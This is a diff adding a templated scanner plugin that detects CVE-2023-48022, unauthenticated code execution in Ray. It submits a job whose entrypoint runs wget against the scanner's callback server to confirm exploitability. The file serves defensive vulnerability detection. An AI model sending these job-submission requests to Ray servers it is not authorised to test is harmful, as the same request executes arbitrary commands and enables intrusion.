@@ -1,0 +1,89 @@
+# proto-file: proto/templated_plugin.proto
+# proto-message: TemplatedPlugin
+
+###############
+# PLUGIN INFO #
+###############
+
+info: {
+  type: VULN_DETECTION
+  name: "Ray_CVE_2023_48022"
+  author: 
+    "Robert Dick (robert@doyensec.com) for templated version, "
+    "Marius Steffens (mariussteffens@google.com) for original Java version"
+  version: "2.0"
+}
+
+finding: {
+  main_id: {
+    publisher: "GOOGLE"
+    value: "CVE_2023_48022"
+  }
+  severity: CRITICAL
+  title: "CVE-2023-48022 Arbitrary Code Execution in Ray"
+  description: 
+    "An attacker can use the job upload functionality to execute arbitrary code on"
+    " the server hosting the ray application."
+  recommendation:
+    "There is no patch available as this is considered intended functionality."
+    " Restrict access to ray to be local only, and do not expose it to the"
+    " network."
+  related_id: {
+    publisher: "CVE",
+    value: "CVE-2023-48022"
+  }
+}
+
+###########
+# ACTIONS #
+###########
+
+actions: {
+  name: "trigger_callback"
+  http_request: {
+    method: POST
+    uri: "/api/job_agent/jobs/"
+    headers: [
+      { name: "Content-Type" value: "application/json" }
+    ]
+    data: 
+      '{"entrypoint": "wget -qO- {{ T_CBS_URI }}"}'
+  }
+}
+
+actions: {
+  name: "trigger_callback_old"
+  http_request: {
+    method: POST
+    uri: "/api/jobs/"
+    headers: [
+      { name: "Content-Type" value: "application/json" }
+    ]
+    data: 
+      '{"entrypoint": "wget -qO- {{ T_CBS_URI }}"}'
+  }
+}
+
+actions: {
+  name: "sleep"
+  utility: { sleep: { duration_ms: 1000 } }
+}
+
+actions: {
+  name: "check_callback_server_logs"
+  callback_server: { action_type: CHECK }
+}
+
+#############
+# WORKFLOWS #
+#############
+
+workflows: {
+  condition: REQUIRES_CALLBACK_SERVER
+  actions: [
+    "trigger_callback",
+    "trigger_callback_old",
+    "sleep",
+    "check_callback_server_logs"
+  ]
+}
